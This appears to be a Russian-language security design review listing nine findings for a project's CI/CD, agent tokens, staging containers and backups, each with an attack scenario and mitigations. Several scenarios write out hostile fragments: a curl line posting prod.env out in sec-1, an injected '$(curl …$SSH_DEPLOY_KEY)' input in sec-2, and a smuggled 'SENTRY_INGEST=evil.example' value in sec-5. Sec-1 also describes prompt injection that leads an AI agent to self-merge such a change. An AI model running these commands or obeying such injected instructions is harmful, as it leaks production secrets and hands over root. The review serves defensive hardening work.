# F7 — security, раунд 1

## 🔴 sec-1. При варианте F7-Q7 «токен Ivan» агент сам мержит в `main`, а код из `main` исполняется на prod-VPS
Раздел 16 п.1–2 и F7-Q7 (б): ruleset требует только PR и проверки `check`/`e2e`, обязательное ревью CODEOWNERS «включается, только если агенты пушат с отдельной учётной записи». Токен агентов (п.8) с Contents и Pull requests на запись может выполнить `gh pr merge`. SECURITY §17 (MUST «мерж — Ivan»; `deploy/**` в CODEOWNERS за Ivan) и S24 при этом технически не выполняются: защиту держит только дисциплина. Хуже то, что `entry.sh` (9.3 шаг 1) делает `reset --hard` на `origin/main` при **любом** вызове, в том числе `staging up`. Дальше `deploy.sh`/`backup.sh` из `main` работают от `deploy` (группа `docker`, то есть root). Скрипты `scripts/ops/` из того же клона запускает Ivan.
Сценарий атаки: prompt-injection в Issue или тексте Feedback, агент дописывает в `deploy/remote/deploy.sh` строку `curl -d @/srv/chezz/env/prod.env …`, сам открывает и мержит PR (проверки зелёные). Ivan подтверждает очередную выкатку staging и не видит в ней ничего необычного. Секреты prod, B2 и Telegram утекают, у атакующего root на prod.
Последствие: на варианте (б) не держатся ни §1 «агентам нельзя SSH и секреты», ни принятый риск SECURITY §17 «staging не даёт ничего для prod».
Варианты: (а) закрыть F7-Q7 отдельной учётной записью агентов (роль write) и сделать MUST в ruleset `main` «Require review from Code Owners» на `/.github/`, `/deploy/`, `/scripts/ops/`. Тогда п.2 из условного становится безусловным. (б) Если учётная запись одна, `entry.sh` берёт скрипты не из `origin/main`, а из подписанного тега: `git verify-tag` ключом Ivan, тег ставит только Ivan. Отдельно записать MUST NOT: агенты не используют `gh auth` Ivan, только fine-grained токен п.8.

## 🟠 sec-2. Вход `image` и «любой digest» дают путь от образа из ветки к prod
Разделы 9.2, 9.3, 9.5, 10. `image` — свободная строка в `workflow_dispatch`, и нигде нет MUST передавать входы через `env:` и проверять формат на runner. Если в `run:` окажется `${{ inputs.image }}`, это инъекция в job `deploy` среды prod, где лежит `SSH_DEPLOY_KEY` prod. Проверка regex на VPS срабатывает уже после runner. Вторая часть: `entry.sh prod deploy <digest>` принимает любой digest из `ghcr.io/<owner>/chezz-app`, а в этот же пакет пушит `build` из любой ветки при выкатке staging (6.2).
Сценарий атаки: агент запускает `-f env=prod -f action=rollback -f image='$(curl …$SSH_DEPLOY_KEY)'`, Ivan подтверждает «откат». С ключом prod на prod выкатывается образ, собранный из ветки агента.
Варианты: (а) MUST: входы только через `env:`, первый шаг проверяет `^sha256:[0-9a-f]{64}$`, `env`/`action` — тип `choice`. (б) Разные пакеты: `chezz-app` пушит только запуск на `main`, ветки пушат в `chezz-app-staging`. `entry.sh prod` тянет только из `chezz-app`.

## 🟠 sec-3. Права токена агентов перечислены не полностью; `VPS_HOST`/`VPS_HOST_KEY` лежат в переменных репозитория
Раздел 16 п.8 запрещает Workflows и Administration, но молчит про Variables, Secrets и Environments. Раздел 7 хранит `VPS_HOST` и `VPS_HOST_KEY` как vars **репозитория**, вне защиты environment.
Сценарий атаки: токен с Variables: write меняет `VPS_HOST` и `VPS_HOST_KEY` на сервер атакующего. Ivan подтверждает обычную выкатку prod, и job `deploy` отправляет все секреты prod по stdin на чужой хост: `StrictHostKeyChecking` проходит, ведь подменён и ключ хоста.
Варианты: (а) п.8 — явный список «нет»: Secrets, Variables, Environments, Administration, Workflows. Перенести `VPS_HOST`/`VPS_HOST_KEY` в vars environments `prod`/`staging`. (б) Сверх (а): проверять отпечаток ключа хоста по значению из `main` (отпечаток не секрет). Тогда смена переменной ничего не даёт.

## 🟠 sec-4. Код ветки работает на prod-хосте в контейнерах без ужесточения
Раздел 6.1 и SECURITY §17 (принятый риск: staging — код веток). Для `app-staging` и `tools-staging` не заданы `cap_drop: [ALL]`, `security_opt: no-new-privileges`, `read_only`, `pids_limit`, `cpus`. Для цели `tools` (6.2) не указан `USER node`. Нет MUST NOT на монтирование `docker.sock` и каталогов хоста. Изоляция staging от prod — только сети и ядро общего хоста.
Сценарий атаки: ветка с вредоносной зависимостью запускает в `tools-staging` процесс от root со стандартными capabilities, а это ближайший шаг к побегу из контейнера (root на VPS = prod). Вариант проще: форк-бомба или CPU-цикл в `app-staging` кладёт prod. У `cpus` нет лимита, а `mem_limit` от этого не спасает.
Варианты: (а) MUST для всех staging-сервисов: `user` не root, `cap_drop: ALL`, `no-new-privileges`, `read_only` + `tmpfs`, `pids_limit: 256`, `cpus: 1.0`; MUST NOT: `privileged`, `docker.sock`, bind-mount хоста. (б) Сверх (а): userns-remap или rootless Docker — дороже, вернуться, если staging станет постоянным.

## 🟠 sec-5. Командам staging не запрещено трогать файлы и настройки prod
Разделы 7 и 9.3. Allowlist разбит на `[prod]`, `[staging]`, `[ops]`, но не сказано, что `staging up` принимает только `[staging]` и пишет только `staging.env`. `compose.env` общий: в нём `PROD_APP_IMAGE`, `APP_DOMAIN`, `SENTRY_INGEST`, `ACME_EMAIL`. Из какой команды и из какого stdin он заполняется, не определено. По SECURITY §17 ключ staging относится к зоне принятого риска.
Сценарий атаки: держатель ключа staging передаёт в stdin `up` строку `SENTRY_INGEST=evil.example` или `PROD_APP_IMAGE=…`. При следующем `up edge db app` prod получает CSP `connect-src` на чужой хост или чужой образ.
Варианты: (а) MUST: команды staging пишут только `staging.env` и строку `STAGING_*` в `compose.env`; ключи вне `[staging]` — отказ. Значения `APP_DOMAIN`/`SENTRY_INGEST`/`ACME_EMAIL` принимает только `prod deploy`. Значения без `\n`, `$` и кавычек. (б) Разделить файлы на `compose.prod.env` (пишет только prod) и `compose.staging.env`.

## 🟠 sec-6. Бэкап зашифрован, но не аутентифицирован: при восстановлении после взлома можно восстановить подложенный дамп
Раздел 14.1 и 14.3 шаг 5. Открытый ключ `age` лежит в публичном репозитории. Ключ B2 на VPS с `writeFiles` может загружать файлы с любым именем и скрывать файлы (hide). `restore-prod.sh --from-b2` берёт «последний». `pg_restore` дампа `-Fc` от суперпользователя выполняет SQL из дампа: функции, триггеры, `COPY … TO PROGRAM`.
Сценарий атаки: VPS взломан, Ivan поднимает новый по 14.3. Атакующий заранее загрузил в B2 «свежий» дамп со своими строками `sessions` (вход под любым игроком) и триггером. Компрометация переезжает на новый VPS.
Варианты: (а) 14.3: Ivan явно выбирает файл с датой загрузки в B2 до инцидента (`rclone lsl`, а не «последний»). `pg_restore --no-owner --no-privileges` ролью `app`, а не `postgres`. После восстановления — `logout-everyone.sql`. (б) Сверх (а): подпись дампа ключом, которого нет на VPS, невозможна при автоматическом бэкапе. Принять риск явно и записать это в 14.3.

## 🟡 sec-7. Job `smoke` staging исполняет код ветки в environment
9.4: `npm ci` и Playwright из ветки работают в job с environment `staging`. Нет MUST, что env этого job содержит только `SEED_TOKEN_SECRET`, без `SSH_DEPLOY_KEY`, и что `checkout` идёт с `persist-credentials: false`. Если смотреть на 9.2, `ssh … status` легко попадает в тот же job. Сценарий: postinstall ветки читает ключ из env. Варианты: (а) SSH-шаги вынести в отдельный job, без `npm ci`; (б) ключ задавать на уровне шага, не job.

## 🟡 sec-8. «Без подтверждения Ivan workflow не стартует» — неверно для `build`; агент может отменить выкатку prod на середине
§1 и раздел 10. `build` (`packages: write`) запускается из любой ветки без подтверждения и публикует образ в публичный GHCR. С правом Actions: write агент может отменить уже подтверждённый run, тогда SSH рвётся между шагами 4 и 5 из 9.3. Варианты: (а) исправить формулировку §1. `deploy.sh` на VPS запускать через `systemd-run`/`setsid`, чтобы обрыв SSH его не убивал. (б) MUST NOT агентам: `gh run cancel` для run'ов `deploy.yml` env=prod.

## 🟡 sec-9. Ключ `ops`: в разделе 5 нет пароля на ключ и правила `sudo`
SECURITY §16 требует ed25519 с паролем на ключ. В разделе 5 п.1 об этом ничего нет, и не сказано, `sudo` с паролем или NOPASSWD. Сценарий: украденный с машины Ivan ключ без пароля сразу даёт root. Варианты: (а) повторить требование §16 и задать `sudo` с паролем; (б) ключ на аппаратном токене (`ed25519-sk`).

## Вне линзы
- 14.2 и 7: `restore-check.sh --from-b2` запускается от `ops`, а `ops.env` (ключ B2) — 600 `deploy`. Ivan не сможет его прочитать без `sudo` (agentability/consistency).
